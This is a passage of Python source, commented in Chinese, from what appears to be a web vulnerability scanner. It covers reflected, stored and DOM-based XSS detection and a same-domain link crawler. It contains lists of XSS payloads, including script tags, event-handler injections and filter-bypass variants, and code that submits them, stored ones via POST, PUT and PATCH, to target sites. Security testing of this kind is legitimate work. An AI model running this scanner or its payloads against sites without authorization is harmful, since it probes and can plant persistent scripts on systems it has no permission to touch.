        if keyword_count >= 2 and is_exploitable and danger_level in ["低", "中"]:
            danger_level = "中"
            reason = f"Payload包含{keyword_count}个危险关键字"
        
        # 最后检查：是否真正可执行
        if not is_exploitable or danger_level == "低":
            # 如果payload被正确反射但不可执行，可能不是真正的漏洞
            if not has_exec_chars:
                return False, "无", "Payload缺少执行特征，不构成XSS漏洞"
            # 即使有执行特征，如果危险等级是低，也不报告
            return False, "低", "Payload虽被反射但无明显执行风险"
        
        return is_exploitable, danger_level, reason

    def check_xss(self, url_input, method='GET', data=None, cookies=None, headers=None, verbose=False):
        """
        完整的XSS扫描功能 - 修复存储型XSS检测问题

        修复点：
        1. 存储型XSS检测现在会尝试所有支持的方法（POST, PUT, PATCH）
        2. 为每个方法独立进行存储型XSS检测

        Args:
            url_input: 单个URL字符串或URL列表
            method: 建议的请求方法，但存储型检测会尝试所有方法
            data: 请求体数据 (字典格式)
            cookies: cookie字典
            headers: 请求头字典

        Returns:
            tuple: (漏洞列表, 扫描结果)
        """
        vulnerabilities = []
        tested_params = {}  # 记录已测试的参数，用于去重

        # 统一处理输入：将单个URL转换为列表
        if isinstance(url_input, str):
            urls = [url_input]
        elif isinstance(url_input, list):
            urls = url_input
        else:
            raise TypeError(f"url_input必须是字符串或列表，但得到{type(url_input)}")

        # 存储型XSS支持的方法列表
        stored_xss_methods = ['POST', 'PUT', 'PATCH']

        for url in urls:
            if not isinstance(url, str):
                print(f"跳过非字符串URL: {url}")
                continue

            print_colored(f"\n{'='*60}", "yellow")
            print_colored(f"\n🔍 开始XSS扫描URL: {url}", "red")
            print_colored(f"\n{'='*60}", "yellow")

            # ==================== 阶段1：反射型XSS检测 ====================
            print(f"\n[*] 阶段1：反射型XSS检测")

            # 提取URL中的参数
            url_params = self._extract_parameters(url)

            # 准备要测试的参数
            test_params = {}

            # 根据HTTP方法处理参数
            if method.upper() in ['POST', 'PUT', 'PATCH', 'OPTIONS'] and data:
                test_params = data.copy()
            elif url_params:
                test_params = url_params.copy()
            else:
                # 如果没有参数，使用默认测试参数
                test_params = {
                    'id': 'test',
                    'q': 'search',
                    'search': 'test',
                    'keyword': 'test',
                    'name': 'test',
                    'email': 'test@test.com',
                    'username': 'test',
                    'comment': 'test',
                    'message': 'test',
                    'content': 'test',
                    'title': 'test',
                    'description': 'test',
                    'text': 'test',
                    'input': 'test',
                    'user_input': 'test',
                    'reflected': 'test',
                    'value': 'test',
                    'data': 'test'
                }

            if not test_params:
                print(f"[-] URL {url} 没有可测试的参数")
            else:
                print(f"[*] 发现/使用 {len(test_params)} 个参数: {list(test_params.keys())}")

                # 测试每个参数
                for param_name, original_value in test_params.items():
                    print(f"\n[*] 测试参数: {param_name}")

                    # 获取基准响应（不注入任何payload的响应）
                    try:
                        if method.upper() in ['POST', 'PUT', 'PATCH', 'OPTIONS']:
                            baseline_request = {
                                'method': method.upper(),
                                'url': url.split('?')[0],
                                'headers': headers or {},
                                'data': data.copy() if data else {},
                                'cookies': cookies
                            }
                        else:
                            baseline_request = {
                                'method': method.upper(),
                                'url': url,
                                'headers': headers or {},
                                'cookies': cookies
                            }

                        baseline_response = self.send_controlled_request(baseline_request)
                        baseline_text = baseline_response.get('response', {}).get('text', '') if baseline_response else ""
                    except:
                        baseline_text = ""

                    # 检查参数是否被处理
                    param_processed = False
                    marker_value = f"AAAA{int(time.time()%10000)}AAAA"

                    try:
                        if method.upper() in ['POST', 'PUT', 'PATCH', 'OPTIONS']:
                            marker_request = {
                                'method': method.upper(),
                                'url': url.split('?')[0],
                                'headers': headers or {},
                                'data': {param_name: marker_value} if not data else {**data, param_name: marker_value},
                                'cookies': cookies
                            }
                        else:
                            if url_params:
                                test_params_copy = url_params.copy()
                                test_params_copy[param_name] = marker_value
                                parsed = urlparse(url)
                                query_string = '&'.join([f"{k}={v}" for k, v in test_params_copy.items()])
                                marker_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"
                            else:
                                separator = '&' if '?' in url else '?'
                                marker_url = f"{url}{separator}{param_name}={marker_value}"

                            marker_request = {
                                'method': method.upper(),
                                'url': marker_url,
                                'headers': headers or {},
                                'cookies': cookies
                            }

                        marker_response = self.send_controlled_request(marker_request)
                        if marker_response:
                            marker_text = marker_response.get('response', {}).get('text', '')
                            if marker_value in marker_text:
                                param_processed = True
                                print(f"  [✓] 参数 {param_name} 被服务器接受并处理")
                            else:
                                # 检查响应是否与基线完全相同
                                from difflib import SequenceMatcher
                                if baseline_text:
                                    similarity = SequenceMatcher(None, baseline_text[:2000], marker_text[:2000]).ratio()
                                    if similarity > 0.95:
                                        print(f"  [✗] 参数 {param_name} 未被处理（响应完全相同，相似度{similarity*100:.1f}%）")
                                    else:
                                        print(f"  [?] 参数 {param_name} 可能被处理（相似度{similarity*100:.1f}%）")
                                        param_processed = True
                    except Exception as e:
                        print(f"  [-] 检测参数处理状态时出错: {e}")

                    # 如果参数完全未被处理，跳过所有payload测试
                    if not param_processed:
                        print(f"  [*] 跳过参数 {param_name} 的payload测试，因为参数未被服务器处理")
                        continue
                    
                    # 测试payload
                    param_vulns = []
                    tested_payloads = set()

                    for payload_idx, payload in enumerate(self.xss_payloads):
                        if payload.lower() in tested_payloads:
                            continue
                        tested_payloads.add(payload.lower())

                        try:
                            if method.upper() in ['POST', 'PUT', 'PATCH', 'OPTIONS']:
                                test_data = data.copy() if data else {}
                                test_data[param_name] = payload

                                request_info = {
                                    'method': method.upper(),
                                    'url': url.split('?')[0],
                                    'headers': headers or {},
                                    'data': test_data,
                                    'cookies': cookies
                                }
                            else:
                                if url_params:
                                    test_params_copy = url_params.copy()
                                    test_params_copy[param_name] = payload

                                    parsed = urlparse(url)
                                    query_string = '&'.join([f"{k}={v}" for k, v in test_params_copy.items()])
                                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"
                                else:
                                    separator = '&' if '?' in url else '?'
                                    test_url = f"{url}{separator}{param_name}={payload}"

                                request_info = {
                                    'method': method.upper(),
                                    'url': test_url,
                                    'headers': headers or {},
                                    'cookies': cookies
                                }

                            print(f"  [>] 测试payload #{payload_idx+1}: {payload[:50]}...")

                            response = self.send_controlled_request(request_info)

                            if response:
                                response_text = response.get('response', {}).get('text', '')

                                # 检测XSS漏洞
                                is_vulnerable, confidence, details = self._detect_xss_in_response(
                                    response_text, payload, original_value
                                )

                                if is_vulnerable:
                                    vuln_info = {
                                        "url": url,
                                        "type": "反射型XSS",
                                        "parameter": param_name,
                                        "payload": payload,
                                        "confidence": confidence,
                                        "method": method,
                                        "details": details,
                                        "response_code": response.get('response', {}).get('status_code'),
                                        "tested_url": request_info.get('url') if method.upper() == 'GET' else url
                                    }

                                    if method.upper() == 'POST':
                                        vuln_info["injected_data"] = request_info.get('data')

                                    param_vulns.append(vuln_info)

                                    print(f"  [!] 发现XSS漏洞！置信度: {confidence}")
                                    print(f"      详情: {details}")

                        except Exception as e:
                            print(f"  [-] 测试参数 {param_name} 时出错: {e}")
                            continue
                        
                    if param_vulns:
                        # 按置信度排序（高>中>低）
                        param_vulns.sort(key=lambda x: {"高": 0, "中": 1, "低": 2}.get(x["confidence"], 3))

                        # 保留所有漏洞结果
                        for vuln in param_vulns:
                            # 记录此漏洞是该参数的第几个（可选）
                            vuln["vuln_index"] = param_vulns.index(vuln) + 1
                            vuln["total_vulns_for_param"] = len(param_vulns)

                            # 如果是第一个（最好的）漏洞，标记为主漏洞
                            if param_vulns.index(vuln) == 0:
                                vuln["is_primary"] = True
                            else:
                                vuln["is_primary"] = False

                            vulnerabilities.append(vuln)

                        # 记录此参数已有漏洞，使用最好的漏洞置信度
                        best_vuln = param_vulns[0]
                        tested_params[f"{url}#{param_name}"] = best_vuln["confidence"]

            # ==================== 阶段2：存储型XSS检测（多方法支持） ====================
            print(f"\n[*] 阶段2：存储型XSS检测（尝试所有支持的方法）")

            # 只在有数据的情况下进行存储型XSS检测
            if data:
                for stored_method in stored_xss_methods:
                    print(f"\n  [*] 尝试 {stored_method} 方法的存储型XSS检测")

                    try:
                        # 调用独立的存储型XSS检测方法
                        stored_xss_vulns = self.detect_stored_xss(url, stored_method, data, cookies, headers)

                        if stored_xss_vulns:
                            # 为每个漏洞添加方法信息
                            for vuln in stored_xss_vulns:
                                if isinstance(vuln, dict):
                                    vuln["method"] = stored_method
                            vulnerabilities.extend(stored_xss_vulns)
                            print(f"  [✓] {stored_method}方法发现 {len(stored_xss_vulns)} 个存储型XSS漏洞")
                        else:
                            print(f"  [-] {stored_method}方法未发现存储型XSS漏洞")

                    except Exception as e:
                        print(f"  [-] {stored_method}方法的存储型XSS检测出错: {e}")
                        continue
            else:
                print(f"  [-] 没有请求体数据，跳过存储型XSS检测")

        # ==================== 阶段3：DOM型XSS检测 ====================
        print(f"\n[*] 阶段3：DOM型XSS检测")
        dom_xss_vulns = self.check_dom_xss(url_input)
        if isinstance(dom_xss_vulns, tuple):
            dom_vulns = dom_xss_vulns[0]
        else:
            dom_vulns = dom_xss_vulns

        if dom_vulns:
            vulnerabilities.extend(dom_vulns)
            print(f"  [✓] 发现 {len(dom_vulns)} 个DOM型XSS漏洞")
        else:
            print(f"  [-] 未发现DOM型XSS漏洞")

        # 最终处理结果
        if vulnerabilities:
            # 按类型和方法排序
            vulnerabilities.sort(key=lambda x: (
                {"反射型XSS": 0, "存储型XSS": 1, "DOM型XSS": 2}.get(x.get("type", ""), 3),
                {"高": 0, "中": 1, "低": 2}.get(x.get("confidence", "低"), 3),
                x.get("method", "")
            ))

            # 输出发现结果
            print(f"\n{'='*60}")
            print(f"XSS扫描完成！共发现 {len(vulnerabilities)} 个漏洞")
            print(f"{'='*60}\n")

            # 按类型和方法统计
            type_stats = {}
            for vuln in vulnerabilities:
                vuln_type = vuln.get('type', '未知')
                method = vuln.get('method', 'N/A')
                key = f"{vuln_type} ({method})"
                type_stats[key] = type_stats.get(key, 0) + 1

            print("漏洞统计（按类型和方法）:")
            for key, count in sorted(type_stats.items()):
                print(f"  {key}: {count}个漏洞")
            print()

            for i, vuln in enumerate(vulnerabilities, 1):
                print(f"{i}. {vuln.get('type', 'XSS')}")
                print(f"   方法: {vuln.get('method', '未知')}")
                print(f"   参数: {vuln.get('parameter', 'N/A')}")
                print(f"   置信度: {vuln.get('confidence', '未知')}")
                print(f"   载荷: {vuln.get('payload', 'N/A')[:60]}")
                print()

        # 更新扫描结果
        self.results['vulnerabilities'].extend(vulnerabilities)

        return vulnerabilities, self.results


    def detect_stored_xss(self, url, method, data, cookies=None, headers=None):
        """
        存储型XSS检测方法
        现在支持多种HTTP方法

        Args:
            url: 目标URL
            method: HTTP方法 (POST, PUT, PATCH等)
            data: 请求体数据
            cookies: cookie字典
            headers: 请求头字典

        Returns:
            list: 发现的漏洞列表
        """
        vulnerabilities = []

        print(f"    [*] 开始存储型XSS检测，方法: {method}")

        # 检查方法是否支持
        if method.upper() not in ['POST', 'PUT', 'PATCH']:
            print(f"    [-] 方法 {method} 不支持存储型XSS检测")
            return vulnerabilities

        if not data:
            print(f"    [-] 没有请求体数据，跳过存储型XSS检测")
            return vulnerabilities

        # 选择存储型XSS特定的payload
        stored_payloads = [
            # 持久化脚本
            "<script>alert('XSS')</script>",
            "<script>alert(document.domain)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            # 尝试持久化存储
            "<script>localStorage.setItem('xss', 'stored')</script>",
            "<script>sessionStorage.setItem('xss', 'stored')</script>",
            # 延迟执行的payload
            "<script>setTimeout(function(){alert('Stored XSS')}, 3000)</script>",
            # 隐蔽的payload
            "<input onfocus=alert(1) autofocus>",
            "<body onload=alert(1)>",
            # 尝试多种标签
            "<iframe src=javascript:alert(1)>",
            "<embed src=javascript:alert(1)>",
            # 尝试绕过过滤
            "<ScRiPt>alert(1)</ScRiPt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
        ]

        # 测试每个参数
        for param_name, original_value in data.items():
            print(f"    [*] 测试存储型参数: {param_name}")

            # 为每个参数测试所有payload
            for payload_idx, payload in enumerate(stored_payloads):
                try:
                    # 准备请求数据
                    test_data = data.copy()
                    test_data[param_name] = payload

                    request_info = {
                        'method': method.upper(),
                        'url': url.split('?')[0],
                        'headers': headers or {},
                        'data': test_data,
                        'cookies': cookies
                    }

                    print(f"      [>] 测试存储型payload #{payload_idx+1}: {payload[:50]}...")

                    # 发送存储请求
                    store_response = self.send_controlled_request(request_info)

                    if not store_response:
                        continue
                    
                    # 等待一段时间让数据存储
                    print(f"      [*] 等待3秒让数据存储...")
                    time.sleep(3)

                    # 发送查看请求（通常是GET请求来查看存储的数据）
                    view_request = {
                        'method': 'GET',
                        'url': url.split('?')[0],
                        'headers': headers or {},
                        'cookies': cookies
                    }

                    view_response = self.send_controlled_request(view_request)

                    if view_response:
                        response_text = view_response.get('response', {}).get('text', '')

                        # 检查payload是否出现在响应中
                        if payload in response_text:
                            # 检查是否可执行
                            is_vulnerable, confidence, details = self._detect_xss_in_response(
                                response_text, payload, original_value
                            )

                            if is_vulnerable:
                                vuln_info = {
                                    "url": url,
                                    "type": "存储型XSS",
                                    "parameter": param_name,
                                    "payload": payload,
                                    "confidence": confidence,
                                    "method": method,
                                    "details": details,
                                    "response_code": store_response.get('response', {}).get('status_code'),
                                    "storage_location": "server",
                                    "tested_method": method
                                }

                                vulnerabilities.append(vuln_info)
                                print(f"      [!] 发现存储型XSS漏洞！置信度: {confidence}")
                                print(f"            详情: {details}")

                        # 尝试其他可能显示存储数据的页面
                        # 例如评论页面、列表页面等
                        additional_urls = [
                            url,
                            url + "?action=list",
                            url + "?action=view",
                            url + "?mode=display",
                            url.replace("add", "view").replace("post", "get"),
                        ]

                        for test_url in additional_urls:
                            if test_url != url.split('?')[0]:
                                test_view_request = {
                                    'method': 'GET',
                                    'url': test_url,
                                    'headers': headers or {},
                                    'cookies': cookies
                                }

                                test_view_response = self.send_controlled_request(test_view_request)

                                if test_view_response:
                                    test_response_text = test_view_response.get('response', {}).get('text', '')

                                    if payload in test_response_text:
                                        # 检查是否可执行
                                        is_vulnerable, confidence, details = self._detect_xss_in_response(
                                            test_response_text, payload, original_value
                                        )

                                        if is_vulnerable:
                                            vuln_info = {
                                                "url": test_url,
                                                "type": "存储型XSS",
                                                "parameter": param_name,
                                                "payload": payload,
                                                "confidence": confidence,
                                                "method": method,
                                                "details": details,
                                                "response_code": test_view_response.get('response', {}).get('status_code'),
                                                "storage_location": "server",
                                                "tested_method": method,
                                                "found_on": test_url
                                            }

                                            # 避免重复添加相同的漏洞
                                            if not any(v.get('payload') == payload and v.get('found_on') == test_url for v in vulnerabilities):
                                                vulnerabilities.append(vuln_info)
                                                print(f"      [!] 在 {test_url} 发现存储型XSS漏洞！置信度: {confidence}")

                except Exception as e:
                    print(f"      [-] 测试存储型payload时出错: {e}")
                    continue
                
        return vulnerabilities


    def check_dom_xss(self, url_input):
        """DOM型XSS检测（需要JavaScript执行环境，这里为基础检测）"""
        print("\n[*] 开始DOM型XSS检测...")
        
        vulnerabilities = []
        
        # DOM XSS相关payload
        dom_payloads = [
            "#<script>alert('DOM XSS')</script>",
            "#javascript:alert('DOM XSS')",
            "?param=123#<img src=x onerror=alert(1)>",
            "?returnUrl=javascript:alert('XSS')",
            "?callback=alert('XSS')"
        ]
        
        if isinstance(url_input, str):
            urls = [url_input]
        elif isinstance(url_input, list):
            urls = url_input
        else:
            raise TypeError(f"url_input必须是字符串或列表，但得到{type(url_input)}")
        
        for url in urls:
            for payload in dom_payloads:
                try:
                    # 构建测试URL
                    if payload.startswith('#'):
                        test_url = f"{url}{payload}"
                    elif payload.startswith('?'):
                        test_url = f"{url}{payload}"
                    else:
                        test_url = f"{url}?{payload}"
                    
                    request_info = {
                        'method': 'GET',
                        'url': test_url,
                        'headers': {}
                    }
                    
                    response = self.send_controlled_request(request_info)
                    
                    if response:
                        # 检查响应中是否有JavaScript处理痕迹
                        response_text = response.get('response', {}).get('text', '')
                        
                        # 查找可能的DOM操作
                        dom_indicators = [
                            'document.write',
                            'innerHTML',
                            'eval(',
                            'setTimeout',
                            'location.hash',
                            'window.location'
                        ]
                        
                        for indicator in dom_indicators:
                            if indicator in response_text:
                                vulnerabilities.append({
                                    "url": url,
                                    "type": "可能的DOM型XSS",
                                    "payload": payload,
                                    "confidence": "低",
                                    "details": f"发现DOM操作函数: {indicator}",
                                    "tested_url": test_url
                                })
                                print(f"  [!] 发现可能的DOM XSS漏洞，使用了 {indicator}")
                                break
                
                except Exception as e:
                    print(f"  [-] DOM XSS测试出错: {e}")
        
        # 更新扫描结果
        self.results['vulnerabilities'].extend(vulnerabilities)
        
        return vulnerabilities, self.results

    # ==================== 爬虫功能 ====================
    def crawl_links(self, url_input):
        """爬取页面中的链接"""
        # 统一处理输入：将单个URL转换为列表
        if isinstance(url_input, str):
            urls = [url_input]
        elif isinstance(url_input, list):
            urls = url_input
        else:
            raise TypeError(f"url_input 必须是字符串或列表，但得到 {type(url_input)}")

        all_links = []
        
        for url in urls:
            # 确保URL是字符串
            if not isinstance(url, str):
                print(f"跳过非字符串URL: {url}")
                continue
            
            print(f"\n开始爬取URL: {url}")
            try:
                request_info = {
                    'method': 'GET',
                    'url': url,
                    'headers': {}
                }
                
                response = self.send_controlled_request(request_info)
                
                # 检查响应是否为None（请求失败）
                if response is None:
                    print(f"请求失败，响应为None: {url}")
                    continue
                
                # 检查解析的内容是否存在
                if 'parsed' not in response:
                    print(f"响应中没有parsed字段: {url}")
                    continue
                    
                body = response['parsed'].get('parsed_content', '') if isinstance(response['parsed'], dict) else str(response['parsed'])
                
                soup = BeautifulSoup(str(body), "html.parser")
                
                # 解析基础URL的域名
                base_domain = urlparse(url).netloc
                links = []
                
                try:
                    if soup:
                        for link in soup.find_all("a", href=True):
                            href = link['href']
                            # 解析链接的域名
                            absolute_url = urljoin(url, href)
                            link_domain = urlparse(absolute_url).netloc                
                            # 只爬取同域名链接（忽略协议差异）
                            if link_domain == base_domain:
                                links.append(absolute_url)
                        all_links.extend(links)
                        print(f"从 {url} 爬取到 {len(links)} 个链接")
                except Exception as e:
                    print(f"解析页面失败: {url}, 错误: {e}")
            except Exception as e:
                print(f"爬取链接失败: {url}, 错误: {e}")
        
        # 去重
        unique_links = list(set(all_links))
        print(f"\n总共爬取到 {len(unique_links)} 个唯一链接")
        
        return unique_links